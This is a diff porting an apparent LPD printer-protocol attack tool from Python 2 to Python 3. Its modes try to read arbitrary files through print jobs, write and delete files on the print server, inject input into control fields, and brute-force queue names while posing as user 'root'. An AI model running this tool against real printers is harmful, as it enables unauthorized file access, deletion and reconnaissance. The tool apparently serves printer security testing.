@@ -65,11 +65,11 @@ args = usage()
 
 # get lpd acknowledgement
 def check_acknowledgement():
-  if s.recv(4096) != "\000":
-	print "Negative acknowledgement"
-	s.send("\001\n") # [ RFC 1179 | 6.1 01 - Abort job ]
-	s.close()
-	sys.exit()
+  if s.recv(4096) != b"\000":
+    print("Negative acknowledgement")
+    s.send(b"\001\n") # [ RFC 1179 | 6.1 01 - Abort job ]
+    s.close()
+    sys.exit()
 
 
 # ----------------------------------------------------------------------
@@ -96,7 +96,7 @@ def getFilequeueList(aFilename):
     
 
   except Exception as e:
-    print ("Error Open file: ",aFilename)
+    print(("Error Open file: ",aFilename))
   finally:
     f.close()
   return filequeueList
@@ -109,8 +109,8 @@ data = "Print job from lpd test '" + args.mode \
      + "' and argument '" + args.argument + "'."
 
 delname = srcfile = jobtitle = jobname = classname = mailname = None
-hostname  = ""      # leave it blank by default so nothing is added
-username  = "root"  # special user-name indicates a privileged user
+hostname = ""      # leave it blank by default so nothing is added
+username = "root"  # special user-name indicates a privileged user
 ctrlfile = "cfA001" # default name of control file
 datafile = "dfA001" # default name of data file
 getname  = datafile # default name of file to print
@@ -121,34 +121,34 @@ bruteQueueNameFile = "printer.txt"  # default name of file to bruteforce Queue N
 if args.mode == 'get':
   getname = args.argument
   data += " If you can read this, the test failed."
-  print "[get] Trying to print file " + args.argument
+  print("[get] Trying to print file " + args.argument)
 
 elif args.mode == 'put':
   ctrlfile = args.argument
   datafile = args.argument
-  print "[put] Trying to write to file " + args.argument
+  print("[put] Trying to write to file " + args.argument)
 
 elif args.mode == 'rm':
   delname = args.argument
-  print "[rm] Trying to delete file " + args.argument
+  print("[rm] Trying to delete file " + args.argument)
 
 elif args.mode == 'in':
   hostname = username = ctrlfile = datafile  = delname  = jobname \
            = srcfile  = jobtitle = classname = mailname = args.argument
-  print "[in] Trying to send user input '" + args.argument + "'"
+  print("[in] Trying to send user input '" + args.argument + "'")
 
 elif args.mode == 'mail':
   try:
     mailname = args.argument.split('@', 1)[0]
     hostname = args.argument.split('@', 1)[1]
   except Exception as e:
-    print "Bad argument" + str(e)
+    print("Bad argument" + str(e))
     sys.exit()
-  print "[mail] Trying to send job information to " + args.argument
+  print("[mail] Trying to send job information to " + args.argument)
 
 elif args.mode == 'brute':
   bruteQueueNameFile = args.argument
-  print "[brute] Trying to brute force queue file " + args.argument
+  print("[brute] Trying to brute force queue file " + args.argument)
 
   # bruteforcequeue(): 
   # try:
@@ -185,12 +185,12 @@ if args.mode == 'brute':
   queueList=getFilequeueList(bruteQueueNameFile)
   # s.settimeout(2) #Wait 2 sec
   for queueName in queueList:
-    s.send("\002"+queueName+"\n")
+    s.send(bytes("\002"+queueName+"\n", 'utf-8'))
     #time.sleep(2)
     
-    if s.recv(4096) != "\000":
+    if s.recv(4096) != b"\000":
       # print "Negative acknowledgement"
-      s.send("\001\n") # [ RFC 1179 | 6.1 01 - Abort job ]
+      s.send(b"\001\n") # [ RFC 1179 | 6.1 01 - Abort job ]
       s.close()
       #reopen for next attempt
       s = socket.socket()
@@ -198,7 +198,7 @@ if args.mode == 'brute':
       continue
 
     else :
-      print "Printer found:",queueName
+      print("Printer found:",queueName)
       break
    
 
@@ -209,19 +209,19 @@ if args.mode == 'brute':
   sys.exit(1)
   
 else:
-  s.send("\002"+queue+"\n")
+  s.send(bytes("\002"+queue+"\n",'utf-8'))
   check_acknowledgement()
 
-s.send("\002"+str(len(ctrl))+" "+ctrlfile+"\n")
+s.send(bytes("\002"+str(len(ctrl))+" "+ctrlfile+"\n",'utf-8'))
 check_acknowledgement()
-s.send(ctrl + "\000") # send control file || file complete indicator
+s.send(bytes(ctrl + "\000",'utf-8')) # send control file || file complete indicator
 check_acknowledgement()
 
 # --------[ RFC 1179 | 6.3 03 - Receive data file ]---------------------
 
-s.send("\003"+str(len(data))+" "+datafile+"\n")
+s.send(bytes("\003"+str(len(data))+" "+datafile+"\n",'utf-8'))
 check_acknowledgement()
-s.send(data + "\000") # send data file || file complete indicator
+s.send(bytes(data + "\000",'utf-8')) # send data file || file complete indicator
 check_acknowledgement()
 
 # ----------------------------------------------------------------------
